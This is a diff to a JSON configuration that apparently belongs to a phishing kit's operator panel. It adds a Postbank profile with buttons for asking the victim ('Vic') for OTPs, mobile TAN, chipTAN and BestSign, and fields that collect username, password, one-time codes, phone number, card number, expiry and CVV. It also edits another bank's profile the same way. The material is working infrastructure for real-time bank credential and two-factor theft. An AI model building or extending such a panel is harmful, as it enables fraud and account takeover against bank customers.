@@ -105,6 +105,10 @@
       "id": "people"
     },
     {
+      "name": "Postbank",
+      "id": "postbank"
+    },
+    {
       "name": "Rural",
       "id": "rural"
     },
@@ -954,6 +958,163 @@
       }
     ]
   },
+  "postbank": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "11"
+      },
+      {
+        "name": "ASK OTP",
+        "status": "2"
+      },
+      {
+        "name": "ASK MOBILE TAN",
+        "status": "4",
+        "input": {
+          "id": "telephone",
+          "placeholder": "Mobile Number"
+        }
+      },
+      {
+        "name": "ASK BEST SIGN",
+        "status": "6"
+      },
+      {
+        "name": "ASK CHIP TAN",
+        "status": "9",
+        "input": {
+          "id": "startCode",
+          "placeholder": "Start Code"
+        }
+      },
+      {
+        "name": "FINISH",
+        "status": "10"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitted Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting OTP"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Mobile TAN"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Mobile TAN"
+      },
+      {
+        "status": 6,
+        "meaning": "Vic Submitting BestSign"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Waiting... Approved BestSign"
+      },
+      {
+        "status": 8,
+        "meaning": "Vic Waiting... Denied BestSign"
+      },
+      {
+        "status": 9,
+        "meaning": "Vic Submitting Chip TAN"
+      },
+      {
+        "status": 10,
+        "meaning": "Vic Waiting... Submitted Chip TAN"
+      },
+      {
+        "status": 11,
+        "meaning": "Finished"
+      },
+      {
+        "status": 8,
+        "meaning": "Vic Submitting Netguard Card"
+      },
+      {
+        "status": 9,
+        "meaning": "Vic Waiting... Submitted Netguard Card"
+      },
+      {
+        "status": 10,
+        "meaning": "Vic Approving Netguard App (use another function if they don't accept)"
+      },
+      {
+        "status": 11,
+        "meaning": "Vic Submitting Telephone"
+      },
+      {
+        "status": 12,
+        "meaning": "Vic Waiting... Submitted Telephone"
+      },
+      {
+        "status": 13,
+        "meaning": "Vic Submitting Card Info"
+      },
+      {
+        "status": 14,
+        "meaning": "Vic Waiting... Submitted Card Info"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Username",
+        "key": "username"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "SMS OTP",
+        "key": "smsCode"
+      },
+      {
+        "heading": "Email OTP",
+        "key": "emailCode"
+      },
+      {
+        "heading": "Netguard Key",
+        "key": "netguardKey"
+      },
+      {
+        "heading": "Phone Number",
+        "key": "telephone"
+      },
+      {
+        "heading": "Card Number",
+        "key": "ccnum"
+      },
+      {
+        "heading": "Card Expiry",
+        "key": "ccexp"
+      },
+      {
+        "heading": "CVV",
+        "key": "cvv"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "username"
+      }
+    ]
+  },
   "boi": {
     "buttons": [
       {
@@ -1075,7 +1236,7 @@
     "buttons": [
       {
         "name": "ASK LOGIN AGAIN",
-        "status": "11"
+        "status": "12"
       },
       {
         "name": "ASK OTP",
@@ -1095,7 +1256,7 @@
       },
       {
         "name": "FINISH",
-        "status": "10"
+        "status": "11"
       }
     ],
     "status": [
@@ -1140,11 +1301,11 @@
         "meaning": "Vic Waiting... Submitted Sec Token"
       },
       {
-        "status": 10,
+        "status": 11,
         "meaning": "Finished"
       },
       {
-        "status": 11,
+        "status": 12,
         "meaning": "Vic Resubmitting Login"
       }
     ],
@@ -1152,10 +1313,6 @@
       {
         "heading": "Username",
         "key": "username"
-      },
-      {
-        "heading": "User ID",
-        "key": "userId"
       },
       {
         "heading": "Password",
@@ -1166,20 +1323,20 @@
         "key": "otp"
       },
       {
-        "heading": "Card Number",
-        "key": "ccnum"
+        "heading": "Mobile Number",
+        "key": "telephone"
       },
       {
-        "heading": "Card Expiry",
-        "key": "ccexp"
+        "heading": "Start Code",
+        "key": "startCode"
       },
       {
-        "heading": "CVV",
-        "key": "cvv"
+        "heading": "Mobile TAN",
+        "key": "mobileTAN"
       },
       {
-        "heading": "Security Token",
-        "key": "secToken"
+        "heading": "Chip TAN",
+        "key": "chipTAN"
       }
     ],
     "mainInfo": [
